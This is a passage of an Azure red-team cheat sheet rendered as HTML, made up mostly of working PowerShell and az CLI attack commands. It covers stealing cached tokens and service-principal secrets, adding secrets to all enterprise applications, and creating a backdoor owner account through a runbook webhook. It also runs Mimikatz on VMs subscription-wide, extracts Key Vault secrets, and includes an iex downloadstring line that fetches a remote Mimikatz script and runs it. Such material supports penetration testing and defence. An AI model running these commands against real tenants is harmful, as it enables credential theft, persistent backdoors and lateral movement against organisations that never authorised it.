<a id="__codelineno-27-19" name="__codelineno-27-19" href="#__codelineno-27-19"></a><span class="k">Function</span>        <span class="n">RefreshTo-O365SuiteUXToken</span>                         <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-20" name="__codelineno-27-20" href="#__codelineno-27-20"></a><span class="k">Function</span>        <span class="n">RefreshTo-OfficeAppsToken</span>                          <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-21" name="__codelineno-27-21" href="#__codelineno-27-21"></a><span class="k">Function</span>        <span class="n">RefreshTo-OfficeManagementToken</span>                    <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-22" name="__codelineno-27-22" href="#__codelineno-27-22"></a><span class="k">Function</span>        <span class="n">RefreshTo-OutlookToken</span>                             <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-23" name="__codelineno-27-23" href="#__codelineno-27-23"></a><span class="k">Function</span>        <span class="n">RefreshTo-SubstrateToken</span>                           <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
</code></pre></div></li>
</ul>
<h2 id="stealing-tokens">Stealing Tokens</h2>
<ul>
<li>Get-AzurePasswords
    <div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">Import-Module</span> <span class="n">Microburst</span><span class="p">.</span><span class="n">psm1</span>
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="nb">Get-AzurePasswords</span>
<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="nb">Get-AzurePasswords</span> <span class="n">-Verbose</span> <span class="p">|</span> <span class="nb">Out-GridView</span>
</code></pre></div></li>
</ul>
<h3 id="stealing-tokens-from-az-cli">Stealing tokens from az cli</h3>
<ul>
<li>az cli stores access tokens in clear text in <strong>accessTokens.json</strong> in the directory <code>C:\Users\&lt;username&gt;\.Azure</code></li>
<li>azureProfile.json in the same directory contains information about subscriptions.</li>
</ul>
<h3 id="stealing-tokens-from-az-powershell">Stealing tokens from az powershell</h3>
<ul>
<li>Az PowerShell stores access tokens in clear text in <strong>TokenCache.dat</strong> in the directory <code>C:\Users\&lt;username&gt;\.Azure</code></li>
<li>It also stores <strong>ServicePrincipalSecret</strong> in clear-text in <strong>AzureRmContext.json</strong> </li>
<li>Users can save tokens using <code>Save-AzContext</code></li>
</ul>
<h2 id="add-credentials-to-all-enterprise-applications">Add credentials to all Enterprise Applications</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c"># Add secrets</span>
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="p">.</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="nb">Add-AzADAppSecret</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Add-AzADAppSecret</span> <span class="n">-GraphToken</span> <span class="nv">$graphtoken</span> <span class="n">-Verbose</span>
<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>
<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="c"># Use secrets to authenticate as Service Principal</span>
<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;&lt;SECRET/PASSWORD&gt;&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;&lt;AppID&gt;&#39;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
<a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Connect-AzAccount</span> <span class="n">-ServicePrincipal</span> <span class="n">-Credential</span> <span class="nv">$creds</span> <span class="n">-Tenant</span> <span class="s1">&#39;&lt;TenantID&gt;&#39;</span>
</code></pre></div>
<h2 id="spawn-ssh-for-azure-web-app">Spawn SSH for Azure Web App</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="n">az</span> <span class="n">webapp</span> <span class="n">create-remote-connection</span> <span class="p">-</span><span class="n">-subscription</span> <span class="p">&lt;</span><span class="n">SUBSCRIPTION-ID</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-resource-group</span> <span class="p">&lt;</span><span class="n">RG-NAME</span><span class="p">&gt;</span> <span class="n">-n</span> <span class="p">&lt;</span><span class="n">APP-SERVICE-NAME</span><span class="p">&gt;</span>
</code></pre></div>
<h2 id="azure-storage-blob">Azure Storage Blob</h2>
<ul>
<li>Blobs - <code>*.blob.core.windows.net</code></li>
<li>File Services - <code>*.file.core.windows.net</code></li>
<li>Data Tables - <code>*.table.core.windows.net</code></li>
<li>Queues - <code>*.queue.core.windows.net</code></li>
</ul>
<h3 id="enumerate-blobs">Enumerate blobs</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="p">.</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">MicroBurst</span><span class="p">\</span><span class="n">Misc</span><span class="p">\</span><span class="n">InvokeEnumerateAzureBlobs</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Invoke-EnumerateAzureBlobs</span> <span class="n">-Base</span> <span class="p">&lt;</span><span class="n">SHORT</span> <span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="n">-OutputFile</span> <span class="n">azureblobs</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="n">Found</span> <span class="n">Storage</span> <span class="n">Account</span> <span class="p">-</span>  <span class="n">testsecure</span><span class="p">.</span><span class="n">blob</span><span class="p">.</span><span class="n">core</span><span class="p">.</span><span class="n">windows</span><span class="p">.</span><span class="n">net</span>
<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="n">Found</span> <span class="n">Storage</span> <span class="n">Account</span> <span class="p">-</span>  <span class="n">securetest</span><span class="p">.</span><span class="n">blob</span><span class="p">.</span><span class="n">core</span><span class="p">.</span><span class="n">windows</span><span class="p">.</span><span class="n">net</span>
<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="n">Found</span> <span class="n">Storage</span> <span class="n">Account</span> <span class="p">-</span>  <span class="n">securedata</span><span class="p">.</span><span class="n">blob</span><span class="p">.</span><span class="n">core</span><span class="p">.</span><span class="n">windows</span><span class="p">.</span><span class="n">net</span>
<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="n">Found</span> <span class="n">Storage</span> <span class="n">Account</span> <span class="p">-</span>  <span class="n">securefiles</span><span class="p">.</span><span class="n">blob</span><span class="p">.</span><span class="n">core</span><span class="p">.</span><span class="n">windows</span><span class="p">.</span><span class="n">net</span>
</code></pre></div>
<h3 id="sas-url">SAS URL</h3>
<ul>
<li>Use <a href="https://azure.microsoft.com/en-us/features/storage-explorer/">Storage Explorer</a></li>
<li>Click on <strong>Open Connect Dialog</strong> in the left menu. </li>
<li>Select <strong>Blob container</strong>. </li>
<li>On the <strong>Select Authentication Method</strong> page<ul>
<li>Select <strong>Shared access signature (SAS)</strong> and click on Next</li>
<li>Copy the URL in <strong>Blob container SAS URL</strong> field.</li>
</ul>
</li>
</ul>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> You can also use <code>subscription</code>(username/password) to access storage resources such as blobs and files.</p>
<h3 id="list-and-download-blobs">List and download blobs</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzResource</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzStorageAccount</span> <span class="n">-name</span> <span class="p">&lt;</span><span class="n">NAME</span><span class="p">&gt;</span> <span class="n">-ResourceGroupName</span> <span class="p">&lt;</span><span class="n">NAME</span><span class="p">&gt;</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzStorageContainer</span> <span class="n">-Context</span> <span class="p">(</span><span class="nb">Get-AzStorageAccount</span> <span class="n">-name</span> <span class="p">&lt;</span><span class="n">NAME</span><span class="p">&gt;</span> <span class="n">-ResourceGroupName</span> <span class="p">&lt;</span><span class="n">NAME</span><span class="p">&gt;).</span><span class="n">context</span>
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzStorageBlobContent</span> <span class="n">-Container</span> <span class="p">&lt;</span><span class="n">NAME</span><span class="p">&gt;</span> <span class="n">-Context</span> <span class="p">(</span><span class="nb">Get-AzStorageAccount</span> <span class="n">-name</span> <span class="p">&lt;</span><span class="n">NAME</span><span class="p">&gt;</span> <span class="n">-ResourceGroupName</span> <span class="p">&lt;</span><span class="n">NAME</span><span class="p">&gt;).</span><span class="n">context</span> <span class="n">-Blob</span>
</code></pre></div>
<h2 id="runbook-automation">Runbook Automation</h2>
<h3 id="create-a-runbook">Create a Runbook</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c"># Check user right for automation</span>
<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="n">az</span> <span class="n">extension</span> <span class="n">add</span> <span class="p">-</span><span class="n">-upgrade</span> <span class="n">-n</span> <span class="n">automation</span>
<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="n">az</span> <span class="n">automation</span> <span class="n">account</span> <span class="n">list</span> <span class="c"># if it doesn&#39;t return anything the user is not a part of an Automation group</span>
<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="n">az</span> <span class="n">ad</span> <span class="n">signed-in-user</span> <span class="n">list-owned-objects</span>
<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>
<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="c"># If the user is not part of an &quot;Automation&quot; group.</span>
<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="c"># Add him to a custom group , e.g: &quot;Automation Admins&quot;</span>
<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="nb">Add-AzureADGroupMember</span> <span class="n">-ObjectId</span> <span class="p">&lt;</span><span class="n">OBJID</span><span class="p">&gt;</span> <span class="n">-RefObjectId</span> <span class="p">&lt;</span><span class="n">REFOBJID</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
<a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>
<a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="c"># Get the role of a user on the Automation account</span>
<a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a><span class="c"># Contributor or higher = Can create and execute Runbooks</span>
<a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a><span class="nb">Get-AzRoleAssignment</span> <span class="n">-Scope</span> <span class="p">/</span><span class="n">subscriptions</span><span class="p">/&lt;</span><span class="n">ID</span><span class="p">&gt;/</span><span class="n">resourceGroups</span><span class="p">/&lt;</span><span class="n">RG-NAME</span><span class="p">&gt;/</span><span class="n">providers</span><span class="p">/</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">Automation</span><span class="p">/</span><span class="n">automationAccounts</span><span class="p">/&lt;</span><span class="n">AUTOMATION-ACCOUNT</span><span class="p">&gt;</span>
<a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a>
<a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="c"># List hybrid workers</span>
<a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a><span class="nb">Get-AzAutomationHybridWorkerGroup</span> <span class="n">-AutomationAccountName</span> <span class="p">&lt;</span><span class="n">AUTOMATION-ACCOUNT</span><span class="p">&gt;</span> <span class="n">-ResourceGroupName</span> <span class="p">&lt;</span><span class="n">RG-NAME</span><span class="p">&gt;</span>
<a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a>
<a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a><span class="c"># Create a Powershell Runbook</span>
<a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Import-AzAutomationRunbook</span> <span class="n">-Name</span> <span class="p">&lt;</span><span class="n">RUNBOOK-NAME</span><span class="p">&gt;</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">username</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-AutomationAccountName</span> <span class="p">&lt;</span><span class="n">AUTOMATION-ACCOUNT</span><span class="p">&gt;</span> <span class="n">-ResourceGroupName</span> <span class="p">&lt;</span><span class="n">RG-NAME</span><span class="p">&gt;</span> <span class="n">-Type</span> <span class="n">PowerShell</span> <span class="n">-Force</span> <span class="n">-Verbose</span>
<a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a>
<a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a><span class="c"># Publish the Runbook</span>
<a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a><span class="nb">Publish-AzAutomationRunbook</span> <span class="n">-RunbookName</span> <span class="p">&lt;</span><span class="n">RUNBOOK-NAME</span><span class="p">&gt;</span> <span class="n">-AutomationAccountName</span> <span class="p">&lt;</span><span class="n">AUTOMATION-ACCOUNT</span><span class="p">&gt;</span> <span class="n">-ResourceGroupName</span> <span class="p">&lt;</span><span class="n">RG-NAME</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
<a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a>
<a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a><span class="c"># Start the Runbook</span>
<a id="__codelineno-33-24" name="__codelineno-33-24" href="#__codelineno-33-24"></a><span class="nb">Start-AzAutomationRunbook</span> <span class="n">-RunbookName</span> <span class="p">&lt;</span><span class="n">RUNBOOK-NAME</span><span class="p">&gt;</span> <span class="n">-RunOn</span> <span class="n">Workergroup1</span> <span class="n">-AutomationAccountName</span> <span class="p">&lt;</span><span class="n">AUTOMATION-ACCOUNT</span><span class="p">&gt;</span> <span class="n">-ResourceGroupName</span> <span class="p">&lt;</span><span class="n">RG-NAME</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</code></pre></div>
<h3 id="persistence-via-automation-accounts">Persistence via Automation accounts</h3>
<ul>
<li>Create a new Automation Account<ul>
<li>"Create Azure Run As account": Yes</li>
</ul>
</li>
<li>Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*<ul>
<li>Sample runbook for this Blog located here – https://github.com/NetSPI/MicroBurst</li>
<li>Publish the runbook</li>
<li>Add a webhook to the runbook</li>
</ul>
</li>
<li>Add the AzureAD module to the Automation account<ul>
<li>Update the Azure Automation Modules</li>
</ul>
</li>
<li>Assign "User Administrator" and "Subscription Owner" rights to the automation account</li>
<li>Eventually lose your access…</li>
<li>Trigger the webhook with a post request to create the new user
    <div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nv">$uri</span> <span class="p">=</span> <span class="s2">&quot;https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d&quot;</span>
<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="nv">$AccountInfo</span>  <span class="p">=</span> <span class="p">@(@{</span><span class="n">RequestBody</span><span class="p">=@{</span><span class="n">Username</span><span class="p">=</span><span class="s2">&quot;BackdoorUsername&quot;</span><span class="p">;</span><span class="n">Password</span><span class="p">=</span><span class="s2">&quot;BackdoorPassword&quot;</span><span class="p">}})</span>
<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="nv">$body</span> <span class="p">=</span> <span class="nb">ConvertTo-Json</span> <span class="n">-InputObject</span> <span class="nv">$AccountInfo</span>
<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="nv">$response</span> <span class="p">=</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Method</span> <span class="n">Post</span> <span class="n">-Uri</span> <span class="nv">$uri</span> <span class="n">-Body</span> <span class="nv">$body</span>
</code></pre></div></li>
</ul>
<h2 id="virtual-machine-runcommand">Virtual Machine RunCommand</h2>
<p>Requirements: 
* <code>Microsoft.Compute/virtualMachines/runCommand/action</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c"># Get Public IP of VM : query the network interface</span>
<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzVM</span> <span class="n">-Name</span> <span class="p">&lt;</span><span class="n">RESOURCE</span><span class="p">&gt;</span> <span class="n">-ResourceGroupName</span> <span class="p">&lt;</span><span class="n">RG-NAME</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">NetworkProfile</span>
<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzNetworkInterface</span> <span class="n">-Name</span> <span class="p">&lt;</span><span class="n">RESOURCE368</span><span class="p">&gt;</span>
<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzPublicIpAddress</span> <span class="n">-Name</span> <span class="p">&lt;</span><span class="n">RESOURCEIP</span><span class="p">&gt;</span>
<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>
<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="c"># Execute Powershell script on the VM</span>
<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Invoke-AzVMRunCommand</span> <span class="n">-VMName</span> <span class="p">&lt;</span><span class="n">RESOURCE</span><span class="p">&gt;</span> <span class="n">-ResourceGroupName</span> <span class="p">&lt;</span><span class="n">RG-NAME</span><span class="p">&gt;</span> <span class="n">-CommandId</span> <span class="s1">&#39;RunPowerShellScript&#39;</span> <span class="n">-ScriptPath</span> <span class="s1">&#39;C:\Tools\adduser.ps1&#39;</span> <span class="n">-Verbose</span>
<a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>
<a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a><span class="c"># Connect via WinRM</span>
<a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nv">$Password</span><span class="p">)</span>
<a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="nv">$creds</span> <span class="n">-SessionOption</span> <span class="p">(</span><span class="nb">New-PSSessionOption</span> <span class="n">-ProxyAccessType</span> <span class="n">NoProxyServer</span><span class="p">)</span>
<a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Enter-PSSession</span> <span class="nv">$sess</span>
</code></pre></div>
<blockquote>
<p>Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\System</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c"># List available VMs</span>
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-AzureRmVM</span> <span class="n">-status</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">PowerState</span> <span class="o">-EQ</span> <span class="s2">&quot;VM running&quot;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ResourceGroupName</span><span class="p">,</span><span class="n">Name</span>
<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="n">ResourceGroupName</span>    <span class="n">Name</span>       
<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="p">-----------------</span>    <span class="p">----</span>       
<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="n">TESTRESOURCES</span>        <span class="n">Remote-Test</span>
<a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>
<a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="c"># Execute Powershell script on the VM</span>
<a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Invoke-AzureRmVMRunCommand</span> <span class="n">-ResourceGroupName</span> <span class="n">TESTRESOURCES</span> <span class="n">-VMName</span> <span class="n">Remote-Test</span> <span class="n">-CommandId</span> <span class="n">RunPowerShellScript</span> <span class="n">-ScriptPath</span> <span class="n">Mimikatz</span><span class="p">.</span><span class="n">ps1</span>
</code></pre></div>
<p>Against the whole subscription using MicroBurst.ps1</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="nb">Import-module</span> <span class="n">MicroBurst</span><span class="p">.</span><span class="n">psm1</span>
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="nb">Invoke-AzureRmVMBulkCMD</span> <span class="n">-Script</span> <span class="n">Mimikatz</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Verbose</span> <span class="n">-output</span> <span class="n">Output</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
<h2 id="keyvault-secrets">KeyVault Secrets</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c"># keyvault access token</span>
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="nb">curl </span><span class="s2">&quot;$IDENTITY_ENDPOINT?resource=https://vault.azure.net&amp;apiversion=2017-09-01&quot;</span> <span class="n">-H</span> <span class="n">secret</span><span class="p">:</span><span class="nv">$IDENTITY_HEADER</span>
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="nb">curl </span><span class="s2">&quot;$IDENTITY_ENDPOINT?resource=https://management.azure.com&amp;apiversion=2017-09-01&quot;</span> <span class="n">-H</span> <span class="n">secret</span><span class="p">:</span><span class="nv">$IDENTITY_HEADER</span>
<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>
<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="c"># connect</span>
<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$token</span> <span class="p">=</span> <span class="s1">&#39;eyJ0..&#39;</span>
<a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$keyvaulttoken</span> <span class="p">=</span> <span class="s1">&#39;eyJ0..&#39;</span>
<a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Connect-AzAccount</span> <span class="n">-AccessToken</span> <span class="nv">$token</span> <span class="n">-AccountId</span> <span class="n">2e91a4fea0f2</span><span class="p">-</span><span class="n">46ee</span><span class="p">-</span><span class="n">8214-fa2ff6aa9abc</span> <span class="n">-KeyVaultAccessToken</span> <span class="nv">$keyvaulttoken</span>
<a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a>
<a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="c"># query the vault and the secrets</span>
<a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzKeyVault</span>
<a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzKeyVaultSecret</span> <span class="n">-VaultName</span> <span class="n">ResearchKeyVault</span>
<a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzKeyVaultSecret</span> <span class="n">-VaultName</span> <span class="n">ResearchKeyVault</span> <span class="n">-Name</span> <span class="n">Reader</span> <span class="n">-AsPlainText</span>
</code></pre></div>
<h2 id="pass-the-prt">Pass The PRT</h2>
<blockquote>
<p>MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c"># Run mimikatz to obtain the PRT</span>
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s2">&quot;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1&quot;</span><span class="p">)</span>
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;privilege::debug&quot; &quot;sekurlsa::cloudap&quot;&#39;</span>
<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>
<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="c"># Copy the PRT and KeyValue</span>
